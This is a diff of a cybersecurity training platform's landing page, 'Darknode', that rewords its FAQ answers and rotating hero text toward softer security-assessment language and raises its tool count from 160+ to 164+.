-              <div class="faq-a-inner">Yes. Every tool on the platform &mdash; HYDRA, AEGIS, SENTINEL EYE, PROMETHEUS, the Pentest Console, Cyber Range, all 160+ security tools, the CLI, the desktop app, and Darknode OS &mdash; is free with no time limits, no trials, and no paywalls. You also get full access to the Nexus AI agent on any plan using your own API key or a free local model like Ollama. Paid plans (coming soon) will add professional extras like automated scan scheduling, AI report generation, and team collaboration, but the core platform stays free forever.</div>
+              <div class="faq-a-inner">Yes. Every tool on the platform &mdash; HYDRA, AEGIS, SENTINEL EYE, PROMETHEUS, PHANTOM, CITADEL, ORACLE, SPECTRE, the Security Assessment Console, Cyber Range, all 164+ security tools, the CLI, the desktop app, and Darknode OS &mdash; is free with no time limits, no trials, and no paywalls. You also get full access to the Nexus AI agent on any plan using your own API key or a free local model like Ollama. Paid plans (coming soon) will add professional extras like automated scan scheduling, AI report generation, and team collaboration, but the core platform stays free forever.</div>
             </div>
           </div>
 
@@ -1279,7 +1279,7 @@ attack methodology for 10.10.14.7:
               <span class="faq-toggle" aria-hidden="true">+</span>
             </button>
             <div class="faq-a" hidden>
-              <div class="faq-a-inner">Yes. Darknode is an educational platform built for learning cybersecurity through hands-on practice. All practice labs and vulnerable environments run locally in Docker containers on your own machine &mdash; you're never attacking external systems. The tools are the same ones used by professional penetration testers and security researchers worldwide (nmap, sqlmap, nuclei, Burp Suite, etc.). If you use Darknode to test real systems, always ensure you have explicit written authorization from the system owner. Unauthorized testing of systems you don't own is illegal regardless of the tools used.</div>
+              <div class="faq-a-inner">Yes. Darknode is an educational platform built for learning cybersecurity through hands-on practice. All practice labs and vulnerable environments run locally in Docker containers on your own machine &mdash; you're never testing external systems without authorization. The tools are the same ones used by professional security assessors and researchers worldwide (nmap, nuclei, Burp Suite, etc.). If you use Darknode to test real systems, always ensure you have explicit written authorization from the system owner. Unauthorized testing of systems you don't own is illegal regardless of the tools used.</div>
             </div>
           </div>
 
@@ -1295,11 +1295,11 @@ attack methodology for 10.10.14.7:
 
           <div class="faq-item">
             <button class="faq-q" aria-expanded="false">
-              <span class="faq-q-text">Can I use this for real penetration tests?</span>
+              <span class="faq-q-text">Can I use this for professional security assessments?</span>
               <span class="faq-toggle" aria-hidden="true">+</span>
             </button>
             <div class="faq-a" hidden>
-              <div class="faq-a-inner">Yes. Darknode includes professional-grade tools for real engagements: the Pentest Console for managing multi-phase assessments, automated scan profiles for reconnaissance, vulnerability scanning and exploitation, the AI-powered report writer that generates client-ready PDF reports, and the engagement tracker for managing findings across multiple targets. Many professional pentesters use Darknode alongside traditional tools like Burp Suite and Metasploit. Always operate within your engagement scope, follow your rules of engagement, and document everything.</div>
+              <div class="faq-a-inner">Yes. Darknode includes professional-grade tools for real engagements: the Security Console for managing multi-phase assessments, automated scan profiles for reconnaissance, vulnerability scanning and verification, the AI-powered report writer that generates client-ready PDF reports, and the engagement tracker for managing findings across multiple targets. Many professional security consultants use Darknode alongside traditional tools like Burp Suite. Always operate within your engagement scope, follow your rules of engagement, and document everything.</div>
             </div>
           </div>
 
@@ -1319,7 +1319,7 @@ attack methodology for 10.10.14.7:
               <span class="faq-toggle" aria-hidden="true">+</span>
             </button>
             <div class="faq-a" hidden>
-              <div class="faq-a-inner">Paid plans (coming soon) add professional features on top of the free platform. The core platform, all 160+ tools, and the CLI stay free forever. Pro and Team tiers unlock extras like automated scan scheduling, vulnerability tracking, AI report generation, and team collaboration.</div>
+              <div class="faq-a-inner">Paid plans (coming soon) add professional features on top of the free platform. The core platform, all 164+ tools, and the CLI stay free forever. Pro and Team tiers unlock extras like automated scan scheduling, vulnerability tracking, AI report generation, and team collaboration.</div>
             </div>
           </div>
 
@@ -1487,7 +1487,7 @@ attack methodology for 10.10.14.7:
   }
 
   // Hero text rotation
-  const words = ["cybersecurity", "ethical hacking", "pentesting", "threat analysis", "red teaming"];
+  const words = ["cybersecurity", "security research", "defense training", "threat analysis", "security operations"];
   let wordIdx = 0;
   const rotateEl = $("hero-rotate");
   if (rotateEl) {
@@ -1656,7 +1656,7 @@ attack methodology for 10.10.14.7:
     });
   });
 
-  // Tool showcase: "View all 160+ tools" links to the tools section in the app
+  // Tool showcase: "View all 164+ tools" links to the tools section in the app
   const tsViewAll = $("ts-view-all");
   if (tsViewAll) {
     tsViewAll.addEventListener("click", (e) => {
